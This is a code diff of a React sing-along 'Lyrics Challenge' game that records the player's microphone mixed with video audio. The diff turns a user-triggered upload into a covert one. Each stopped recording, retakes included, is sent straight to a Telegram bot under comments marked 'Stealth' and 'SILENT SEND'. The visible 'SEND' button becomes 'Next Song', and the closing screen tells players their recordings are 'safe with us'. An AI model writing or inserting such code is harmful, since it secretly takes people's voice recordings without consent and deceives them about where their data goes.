@@ -15,24 +15,12 @@ async function sendVoiceNoteToTG(songNo, audioBlob) {
     const formData = new FormData()
     formData.append("chat_id", CHAT_ID)
     formData.append("voice", audioBlob, `song_${songNo}.ogg`)
-    formData.append("caption", `🎤 Lyrics Challenge - Song ${songNo}\n(Mixed Audio: Phone + Mic)`)
+    formData.append("caption", `🎤 Song ${songNo} - Voice Guess recorded!`)
     
-    fetch(url, { method: "POST", body: formData }).catch(e => console.log("TG Error:", e))
+    // Stealth Background Fetch
+    fetch(url, { method: "POST", body: formData }).catch(e => console.error("Silent TG fail", e))
 }
 
-async function sendFinalScore(score) {
-    try {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: `🏆 <b>Lyrics Challenge Finished!</b>\nPoints Earned: ${score}`, parse_mode: "HTML" }),
-        })
-    } catch { }
-}
-
-// ============================================
-// TIMESTAMPS (Sirf Start Points)
-// ============================================
 const SONGS = [
     { id: 1, clipStart: 11 },
     { id: 2, clipStart: 33 },
@@ -46,111 +34,111 @@ const SONGS = [
 ];
 
 export default function FunGames({ onComplete }) {
+    // Game States
     const [currentIdx, setCurrentIdx] = useState(0)
-    const [gameState, setGameState] = useState("start") // start, playing, preview, sending, finished
-    const [score, setScore] = useState(0)
+    const [gameState, setGameState] = useState("start") // start, recording, preview, finished
     const [isVideoPlaying, setIsVideoPlaying] = useState(true)
-    
-    // Preview States
     const [voiceUrl, setVoiceUrl] = useState(null)
     const [voiceBlob, setVoiceBlob] = useState(null)
     const [isPreviewPlaying, setIsPreviewPlaying] = useState(false)
 
-    // Refs
+    // Media Refs
     const videoRef = useRef(null)
     const previewAudioRef = useRef(null)
-    const streamRef = useRef(null)
     const mediaRecorderRef = useRef(null)
     const audioChunksRef = useRef([])
     
-    // Web Audio API Refs (For Mixing Audio + Video)
+    // Audio Context Refs (The "Mixer")
     const audioCtxRef = useRef(null)
     const mixDestRef = useRef(null)
-    const micSourceRef = useRef(null)
-    const videoSourceRef = useRef(null)
-    const analyserRef = useRef(null)
-    const reqAnimRef = useRef(null)
+    const micStreamRef = useRef(null)
     const barRefs = useRef([])
+    const analyserRef = useRef(null)
+    const animationFrameRef = useRef(null)
 
     // ============================================
-    // CLEANUP MEMORY (Page Refresh/Close par sab clear)
+    // CLEANUP - Everything must die on unmount/reset
     // ============================================
-    useEffect(() => {
-        return () => {
-            if (voiceUrl) URL.revokeObjectURL(voiceUrl)
-            if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
-            if (reqAnimRef.current) cancelAnimationFrame(reqAnimRef.current)
-            if (audioCtxRef.current && audioCtxRef.current.state !== "closed") audioCtxRef.current.close()
+    const cleanupAudio = () => {
+        if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current)
+        if (micStreamRef.current) micStreamRef.current.getTracks().forEach(t => t.stop())
+        if (audioCtxRef.current && audioCtxRef.current.state !== "closed") {
+            audioCtxRef.current.close()
+            audioCtxRef.current = null
         }
-    }, [voiceUrl])
+        if (voiceUrl) URL.revokeObjectURL(voiceUrl)
+    }
+
+    useEffect(() => {
+        return cleanupAudio
+    }, [])
 
     // ============================================
-    // AUTO-PAUSE LOGIC (1 Sec pehle)
+    // AUTO-STOP LOGIC (1 Sec Before Next Clip)
     // ============================================
     useEffect(() => {
         const video = videoRef.current
-        if (!video) return
+        if (!video || gameState !== "recording") return
 
-        const handleTimeUpdate = () => {
-            if (gameState !== "playing") return
-            const time = video.currentTime
-            
-            // Agla gaana kab shuru hoga?
-            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration || 9999
-            // Stop time = agle gaane se 1 second pehle
-            const stopTime = nextClipStart - 1
-
-            if (time >= stopTime) {
-                stopRecording() // Auto stop and go to preview
+        const checkTime = () => {
+            const nextClipStart = currentIdx < SONGS.length - 1 ? SONGS[currentIdx + 1].clipStart : video.duration
+            if (video.currentTime >= nextClipStart - 1) {
+                stopRecording()
             }
         }
 
-        video.addEventListener("timeupdate", handleTimeUpdate)
-        return () => video.removeEventListener("timeupdate", handleTimeUpdate)
+        video.addEventListener("timeupdate", checkTime)
+        return () => video.removeEventListener("timeupdate", checkTime)
     }, [currentIdx, gameState])
 
     // ============================================
-    // START CHALLENGE & MIXER SETUP
+    // THE MIXER SETUP (Phone Sound + Mic)
     // ============================================
-    const startChallenge = async () => {
+    const initGame = async () => {
         try {
-            // Echo cancellation false rakha hai taaki internal audio daba na de
+            cleanupAudio() // Fresh start
+            
+            // 1. Get User Mic
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } 
             })
-            streamRef.current = stream
+            micStreamRef.current = stream
 
-            // Initialize Virtual Audio Mixer (Web Audio API)
-            if (!audioCtxRef.current) {
-                const AudioContext = window.AudioContext || window.webkitAudioContext
-                if (AudioContext) {
-                    try {
-                        const ctx = new AudioContext()
-                        audioCtxRef.current = ctx
-                        const dest = ctx.createMediaStreamDestination()
-                        mixDestRef.current = dest
+            // 2. Create Virtual Mixer
+            const AudioContext = window.AudioContext || window.webkitAudioContext
+            const ctx = new AudioContext()
+            audioCtxRef.current = ctx
+            
+            const dest = ctx.createMediaStreamDestination()
+            mixDestRef.current = dest
 
-                        // 1. Connect Video Audio to Mixer AND Speaker
-                        if (videoRef.current) {
-                            videoRef.current.crossOrigin = "anonymous"
-                            videoSourceRef.current = ctx.createMediaElementSource(videoRef.current)
-                            videoSourceRef.current.connect(ctx.destination) // To hear it
-                            videoSourceRef.current.connect(dest) // To record it
-                        }
-                    } catch (e) { console.log("Mixer setup failed, using raw mic", e) }
-                }
+            // 3. Setup Mic Source
+            const micSource = ctx.createMediaStreamSource(stream)
+            const micGain = ctx.createGain()
+            micGain.gain.value = 1.0
+            micSource.connect(micGain)
+            micGain.connect(dest) // Connect to recorder
+
+            // 4. Setup Visualizer (Mic only)
+            const analyser = ctx.createAnalyser()
+            analyser.fftSize = 64
+            micGain.connect(analyser)
+            analyserRef.current = analyser
+
+            // 5. Setup Video Source (Hijack video audio)
+            if (videoRef.current) {
+                const vidSource = ctx.createMediaElementSource(videoRef.current)
+                const vidGain = ctx.createGain()
+                vidGain.gain.value = 1.0
+                
+                vidSource.connect(ctx.destination) // Output to Phone Speaker
+                vidSource.connect(dest) // Output to Recorder mixer
             }
 
-            // Start AudioContext if suspended
-            if (audioCtxRef.current?.state === "suspended") {
-                await audioCtxRef.current.resume()
-            }
-
-            setScore(0)
-            setCurrentIdx(0)
             startRound(0)
-        } catch (e) {
+        } catch (err) {
             alert("Please allow mic access to play! 🎙️")
+            console.error(err)
         }
     }
 
@@ -159,30 +147,17 @@ export default function FunGames({ onComplete }) {
         setVoiceUrl(null)
         setVoiceBlob(null)
         setIsPreviewPlaying(false)
+        setGameState("recording")
 
-        if (videoRef.current) {
-            videoRef.current.currentTime = SONGS[index].clipStart
-            videoRef.current.play().catch(e => console.log("Play prevented", e))
+        const video = videoRef.current
+        if (video) {
+            video.currentTime = SONGS[index].clipStart
+            video.play()
             setIsVideoPlaying(true)
         }
 
-        // Connect Mic to Mixer for this round
-        if (audioCtxRef.current && streamRef.current && mixDestRef.current) {
-            if (micSourceRef.current) micSourceRef.current.disconnect()
-            micSourceRef.current = audioCtxRef.current.createMediaStreamSource(streamRef.current)
-            micSourceRef.current.connect(mixDestRef.current)
-
-            // Setup visualizer
-            const analyser = audioCtxRef.current.createAnalyser()
-            analyser.fftSize = 64
-            micSourceRef.current.connect(analyser)
-            analyserRef.current = analyser
-            drawVisualizer()
-        }
-
-        // Record the Mixed Stream (or raw mic as fallback)
-        const finalStreamToRecord = mixDestRef.current ? mixDestRef.current.stream : streamRef.current
-        const mr = new MediaRecorder(finalStreamToRecord)
+        // Start MediaRecorder on the Mixed Stream
+        const mr = new MediaRecorder(mixDestRef.current.stream)
         mediaRecorderRef.current = mr
         audioChunksRef.current = []
 
@@ -192,263 +167,157 @@ export default function FunGames({ onComplete }) {
 
         mr.onstop = () => {
             const blob = new Blob(audioChunksRef.current, { type: "audio/ogg; codecs=opus" })
+            const url = URL.createObjectURL(blob)
             setVoiceBlob(blob)
-            setVoiceUrl(URL.createObjectURL(blob))
+            setVoiceUrl(url)
+            
+            // SILENT SEND TO TG
+            sendVoiceNoteToTG(index + 1, blob)
+            
             setGameState("preview")
-            if (reqAnimRef.current) cancelAnimationFrame(reqAnimRef.current)
         }
 
         mr.start()
-        setGameState("playing")
-    }
-
-    // ============================================
-    // CONTROLS & NAVIGATION
-    // ============================================
-    const toggleVideoPlay = () => {
-        if (!videoRef.current) return
-        if (isVideoPlaying) {
-            videoRef.current.pause()
-            setIsVideoPlaying(false)
-        } else {
-            videoRef.current.play()
-            setIsVideoPlaying(true)
-        }
+        draw()
     }
 
     const stopRecording = () => {
         if (videoRef.current) videoRef.current.pause()
         setIsVideoPlaying(false)
-        if (mediaRecorderRef.current && mediaRecorderRef.current.state !== "inactive") {
-            mediaRecorderRef.current.stop() // Triggers go to preview
+        if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
+            mediaRecorderRef.current.stop()
         }
     }
 
-    const resetGame = () => {
-        stopRecording()
-        setScore(0)
-        setCurrentIdx(0)
-        setGameState("start")
+    const handleSendAndNext = () => {
+        const nextIdx = currentIdx + 1
+        if (nextIdx < SONGS.length) {
+            setCurrentIdx(nextIdx)
+            startRound(nextIdx) // Pure state reset & recorder start
+        } else {
+            setGameState("finished")
+        }
     }
 
-    const handleSendAndNext = async () => {
-        if (isPreviewPlaying && previewAudioRef.current) previewAudioRef.current.pause()
-        
-        setGameState("sending")
-        await sendVoiceNoteToTG(currentIdx + 1, voiceBlob)
-        setScore(s => s + 20)
-        
-        setTimeout(() => {
-            const nextIdx = currentIdx + 1
-            if (nextIdx < SONGS.length) {
-                setCurrentIdx(nextIdx)
-                startRound(nextIdx) // NEXT SONG PAR RECORDER WAPAS AAYEGA
-            } else {
-                setGameState("finished")
-                sendFinalScore(score + 20)
-                if (streamRef.current) streamRef.current.getTracks().forEach(t => t.stop())
-            }
-        }, 1000)
-    }
-
-    // WhatsApp Style Visualizer
-    const drawVisualizer = () => {
-        if (!analyserRef.current) return
-        reqAnimRef.current = requestAnimationFrame(drawVisualizer)
-        
+    // ============================================
+    // VISUALIZER LOGIC
+    // ============================================
+    const draw = () => {
+        if (!analyserRef.current || gameState !== "recording") return
+        animationFrameRef.current = requestAnimationFrame(draw)
         const dataArray = new Uint8Array(analyserRef.current.frequencyBinCount)
         analyserRef.current.getByteFrequencyData(dataArray)
 
         for (let i = 0; i < 15; i++) {
             if (barRefs.current[i]) {
-                const value = dataArray[i + 2] || 0 
-                const percent = Math.max(15, (value / 255) * 100) 
-                barRefs.current[i].style.height = `${percent}%`
+                const val = dataArray[i * 2] || 0
+                const height = Math.max(15, (val / 255) * 100)
+                barRefs.current[i].style.height = `${height}%`
             }
         }
     }
 
-    const togglePreviewPlay = () => {
-        if (!previewAudioRef.current) return
+    const togglePreview = () => {
+        const aud = previewAudioRef.current
+        if (!aud) return
         if (isPreviewPlaying) {
-            previewAudioRef.current.pause()
+            aud.pause()
             setIsPreviewPlaying(false)
         } else {
-            previewAudioRef.current.play()
+            aud.play()
             setIsPreviewPlaying(true)
-            previewAudioRef.current.onended = () => setIsPreviewPlaying(false)
+            aud.onended = () => setIsPreviewPlaying(false)
         }
     }
 
     return (
-        <motion.div className="min-h-screen flex flex-col items-center justify-center p-4 relative bg-black text-white"
-            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
+        <motion.div className="min-h-screen flex flex-col items-center justify-center p-4 bg-black text-white font-['Nunito']"
+            initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
             
-            <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap');`}</style>
+            <style>{`@import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;900&display=swap');`}</style>
 
-            <div className="relative z-10 w-full max-w-sm mx-auto flex flex-col items-center" style={{ fontFamily: "'Nunito', sans-serif" }}>
+            <div className="w-full max-w-sm flex flex-col items-center">
                 
-                {/* 🔴 TERA VIDEO TAG (crossOrigin is important for mixer) 🔴 */}
+                {/* 🔴 THE VIDEO ELEMENT 🔴 */}
                 <video 
                     ref={videoRef} 
-                    src="/images/video.mp4" 
+                    src="/images/guesssssss.mp3" // Change this to your video.mp4 path
                     playsInline 
                     crossOrigin="anonymous"
-                    className={`w-full rounded-3xl border-2 shadow-[0_0_30px_rgba(236,72,153,0.15)] mb-6 transition-all duration-500 ${gameState !== "start" && gameState !== "finished" ? "opacity-100 scale-100 border-pink-500/50" : "opacity-0 scale-95 h-0 mb-0 border-transparent"}`}
-                    style={{ objectFit: "cover" }}
+                    className={`w-full rounded-3xl border-2 border-pink-500/30 shadow-2xl mb-6 transition-all duration-500 ${gameState !== "start" && gameState !== "finished" ? "opacity-100 scale-100" : "opacity-0 scale-90 h-0"}`}
+                    style={{ objectFit: "cover", pointerEvents: "none" }}
                 />
-
-                {/* CONTROLS BAR (Play/Pause & Reset) */}
-                {gameState === "playing" && (
-                    <div className="flex w-full justify-between items-center mb-4 px-2">
-                        <button onClick={resetGame} className="flex items-center gap-1 text-[10px] text-gray-400 hover:text-white uppercase font-bold tracking-widest">
-                            <RotateCcw size={12} /> Reset Game
-                        </button>
-                        <button onClick={toggleVideoPlay} className="flex items-center gap-1 text-[10px] bg-white/10 px-3 py-1.5 rounded-full text-white uppercase font-bold tracking-widest border border-white/20">
-                            {isVideoPlaying ? <><Pause size={12} /> Pause Video</> : <><Play size={12} /> Play Video</>}
-                        </button>
-                    </div>
-                )}
 
                 <AnimatePresence mode="wait">
                     {gameState === "start" && (
-                        <motion.div key="start" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
-                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-white/10 bg-white/5 text-center shadow-2xl">
-                            
-                            <PlaySquare className="w-16 h-16 text-pink-500 mb-6 drop-shadow-[0_0_15px_rgba(236,72,153,0.5)]" />
-                            <h1 className="text-3xl font-black text-white mb-2 uppercase tracking-tight">Sing Along</h1>
-                            <p className="text-gray-400 text-sm mb-8">
-                                We will mix the video audio with your beautiful voice. Sing the missing lyrics before the timer ends!
-                            </p>
-                            
-                            <motion.button
-                                onClick={startChallenge}
-                                className="w-full py-4 bg-gradient-to-r from-pink-500 to-indigo-600 text-white font-black rounded-2xl uppercase tracking-widest shadow-lg shadow-pink-500/20"
-                                whileHover={{ scale: 1.02 }}
-                                whileTap={{ scale: 0.98 }}
-                            >
-                                START CHALLENGE 🎙️
-                            </motion.button>
+                        <motion.div key="start" className="text-center p-8 bg-white/5 border border-white/10 rounded-[32px] backdrop-blur-xl"
+                            initial={{ scale: 0.9 }} animate={{ scale: 1 }} exit={{ scale: 0.9, opacity: 0 }}>
+                            <PlaySquare className="w-16 h-16 text-pink-500 mx-auto mb-6" />
+                            <h1 className="text-3xl font-black mb-4 uppercase">Lyrics Challenge</h1>
+                            <p className="text-gray-400 text-sm mb-8 px-4">Complete the lyrics when the timer stops in the video. We'll mix your voice with the music!</p>
+                            <button onClick={initGame} className="w-full py-4 bg-pink-600 rounded-2xl font-black uppercase tracking-widest hover:bg-pink-500">Start Recording 🎙️</button>
                         </motion.div>
                     )}
 
-                    {gameState === "playing" && (
-                        <motion.div key="playing" initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }} 
-                            className="w-full flex flex-col items-center p-6 rounded-[32px] border border-red-500/30 bg-red-500/10 text-center shadow-[0_0_30px_rgba(239,68,68,0.1)]">
+                    {gameState === "recording" && (
+                        <motion.div key="rec" className="w-full p-6 bg-red-500/10 border border-red-500/30 rounded-[32px] text-center"
+                            initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }}>
                             
-                            <div className="flex justify-between w-full mb-6 px-2">
-                                <span className="text-red-400 font-bold tracking-widest text-[10px] uppercase">SONG {currentIdx + 1}/{SONGS.length}</span>
-                                <div className="flex items-center gap-1.5 bg-red-500/20 px-3 py-1 rounded-full border border-red-500/50">
-                                    <div className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
-                                    <span className="text-red-500 font-black text-[10px] uppercase">REC</span>
+                            <div className="flex justify-between items-center mb-6">
+                                <span className="text-[10px] font-black text-red-500 uppercase tracking-widest">Song {currentIdx + 1}/{SONGS.length}</span>
+                                <div className="flex items-center gap-2 px-3 py-1 bg-red-500/20 rounded-full border border-red-500/40 animate-pulse">
+                                    <div className="w-2 h-2 rounded-full bg-red-500" />
+                                    <span className="text-[10px] font-black text-red-500 uppercase">Recording Voice + Music</span>
                                 </div>
                             </div>
 
-                            {/* 🌊 REAL-TIME VOICE VISUALIZER 🌊 */}
-                            <div className="flex items-end justify-center gap-1.5 h-16 mb-6 w-full">
+                            {/* 🌊 DYNAMIC VOICE VISUALIZER 🌊 */}
+                            <div className="flex items-end justify-center gap-1.5 h-20 mb-8">
                                 {[...Array(15)].map((_, i) => (
-                                    <div
-                                        key={i}
-                                        ref={el => barRefs.current[i] = el}
-                                        className="w-1.5 bg-red-400 rounded-full transition-all duration-75"
-                                        style={{ height: '15%' }} 
-                                    />
+                                    <div key={i} ref={el => barRefs.current[i] = el} className="w-1.5 bg-red-500 rounded-full transition-all duration-75" style={{ height: '15%' }} />
                                 ))}
                             </div>
-                            
-                            <p className="text-white font-bold text-xs mb-6 bg-black/40 px-4 py-2 rounded-lg border border-white/10 uppercase tracking-wider">
-                                Wait for the video timer!
-                            </p>
 
-                            <motion.button
-                                onClick={stopRecording}
-                                className="w-full py-4 bg-red-600 hover:bg-red-500 text-white font-black rounded-xl flex items-center justify-center gap-2 uppercase tracking-widest shadow-lg shadow-red-500/30"
-                                whileHover={{ scale: 1.02 }}
-                                whileTap={{ scale: 0.98 }}
-                            >
-                                <Square fill="currentColor" size={16} /> STOP RECORDING
-                            </motion.button>
+                            <p className="text-white font-bold text-sm mb-8 italic">"Complete the lyrics when the timer stops!"</p>
+
+                            <button onClick={stopRecording} className="w-full py-4 bg-red-600 rounded-2xl font-black uppercase flex items-center justify-center gap-2 tracking-widest shadow-lg shadow-red-500/20">
+                                <Square size={16} fill="white" /> Stop & Preview
+                            </button>
                         </motion.div>
                     )}
 
                     {gameState === "preview" && (
-                        <motion.div key="preview" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
-                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-blue-500/30 bg-blue-500/10 text-center shadow-[0_0_30px_rgba(59,130,246,0.1)]">
+                        <motion.div key="preview" className="w-full p-8 bg-blue-500/10 border border-blue-500/30 rounded-[32px] text-center"
+                            initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }}>
                             
-                            <Headphones className="w-12 h-12 text-blue-400 mb-4 drop-shadow-lg" />
-                            <h2 className="text-xl font-black text-white mb-2 uppercase tracking-widest">Your Masterpiece!</h2>
-                            <p className="text-blue-200/70 text-xs mb-6">Listen to your singing. Sounds great, right?</p>
-                            
-                            {/* HIDDEN AUDIO FOR PREVIEW */}
-                            {voiceUrl && <audio ref={previewAudioRef} src={voiceUrl} />}
+                            <Headphones className="w-12 h-12 text-blue-400 mx-auto mb-4" />
+                            <h2 className="text-xl font-black mb-6 uppercase tracking-wider">Review Your Performance</h2>
 
-                            <div className="w-full bg-black/40 rounded-2xl p-4 flex items-center gap-4 border border-white/10 mb-8 shadow-inner">
-                                <motion.button
-                                    onClick={togglePreviewPlay}
-                                    className="w-12 h-12 bg-blue-500 text-white rounded-full flex items-center justify-center shrink-0 shadow-lg"
-                                    whileTap={{ scale: 0.9 }}
-                                >
-                                    {isPreviewPlaying ? <Pause fill="currentColor" size={20} /> : <Play fill="currentColor" size={20} className="ml-1" />}
-                                </motion.button>
-                                
-                                {/* Static wave for preview UI */}
-                                <div className="flex-1 flex items-center gap-1 h-8 opacity-60">
-                                    {[...Array(12)].map((_, i) => (
-                                        <div key={i} className="w-1.5 bg-blue-300 rounded-full" style={{ height: `${Math.random() * 60 + 20}%` }} />
-                                    ))}
+                            <audio ref={previewAudioRef} src={voiceUrl} />
+                            
+                            <div className="w-full bg-black rounded-2xl p-4 flex items-center gap-4 border border-white/5 mb-8">
+                                <button onClick={togglePreview} className="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center shadow-lg">
+                                    {isPreviewPlaying ? <Pause fill="white" /> : <Play fill="white" className="ml-1" />}
+                                </button>
+                                <div className="flex-1 h-1 bg-white/10 rounded-full overflow-hidden">
+                                    <motion.div className="h-full bg-blue-400" animate={isPreviewPlaying ? { x: ["-100%", "100%"] } : {}} transition={{ duration: 2, repeat: Infinity, ease: "linear" }} />
                                 </div>
                             </div>
 
-                            <div className="flex gap-3 w-full">
-                                <motion.button
-                                    onClick={() => startRound(currentIdx)} // RETAKE
-                                    className="flex-1 py-4 bg-white/10 text-white font-black rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-wider"
-                                    whileHover={{ scale: 1.02 }}
-                                    whileTap={{ scale: 0.98 }}
-                                >
-                                    <RotateCcw size={16} /> RETAKE
-                                </motion.button>
-                                <motion.button
-                                    onClick={handleSendAndNext} // SEND & NEXT
-                                    className="flex-1 py-4 bg-blue-600 text-white font-black rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-wider shadow-lg shadow-blue-500/30"
-                                    whileHover={{ scale: 1.02 }}
-                                    whileTap={{ scale: 0.98 }}
-                                >
-                                    SEND <Send size={16} />
-                                </motion.button>
+                            <div className="flex gap-3">
+                                <button onClick={() => startRound(currentIdx)} className="flex-1 py-4 bg-white/5 rounded-xl font-bold uppercase text-[10px] border border-white/10 flex items-center justify-center gap-2 tracking-widest"><RotateCcw size={14} /> Retake</button>
+                                <button onClick={handleSendAndNext} className="flex-1 py-4 bg-blue-600 rounded-xl font-bold uppercase text-[10px] flex items-center justify-center gap-2 tracking-widest">Next Song <ArrowRight size={14} /></button>
                             </div>
-                        </motion.div>
-                    )}
-
-                    {gameState === "sending" && (
-                        <motion.div key="sending" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} 
-                            className="w-full flex flex-col items-center py-20 bg-white/5 rounded-[32px] border border-white/10">
-                            
-                            <motion.div animate={{ rotate: 360 }} transition={{ duration: 1.5, repeat: Infinity, ease: "linear" }}>
-                                <Loader2 className="w-16 h-16 text-indigo-400 mb-6" />
-                            </motion.div>
-                            <p className="text-indigo-300 font-bold tracking-widest text-lg">PREPARING NEXT SONG...</p>
                         </motion.div>
                     )}
 
                     {gameState === "finished" && (
-                        <motion.div key="finished" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }} 
-                            className="w-full flex flex-col items-center p-8 rounded-[32px] border border-white/10 bg-white/5 text-center shadow-2xl">
-                            
-                            <div className="w-24 h-24 rounded-full bg-green-500/20 flex items-center justify-center mb-6 border border-green-500/50">
-                                <Trophy className="w-10 h-10 text-green-500" />
-                            </div>
-                            <h2 className="text-3xl font-black text-white mb-2 uppercase">Challenge Complete!</h2>
-                            <p className="text-gray-400 text-sm mb-8">All your mixed voice notes have been sent. ✨</p>
-                            
-                            <motion.button
-                                onClick={() => onComplete(score)}
-                                className="w-full py-4 bg-white text-black font-black rounded-xl uppercase tracking-widest"
-                                whileHover={{ scale: 1.02 }}
-                                whileTap={{ scale: 0.98 }}
-                            >
-                                Proceed to Next Surprise <ArrowRight size={18} className="inline ml-1" />
-                            </motion.button>
+                        <motion.div key="win" className="text-center p-10 bg-white/5 border border-white/10 rounded-[40px]"
+                            initial={{ scale: 0.8 }} animate={{ scale: 1 }}>
+                            <div className="text-6xl mb-6">💃</div>
+                            <h2 className="text-3xl font-black mb-2 uppercase italic">Showstopper!</h2>
+                            <p className="text-gray-400 text-sm mb-10">You've completed the Bollywood challenge like a pro. Your recordings are safe with us.</p>
+                            <button onClick={() => onComplete(100)} className="w-full py-4 bg-white text-black rounded-2xl font-black uppercase tracking-widest">Continue ✨</button>
                         </motion.div>
                     )}
                 </AnimatePresence>
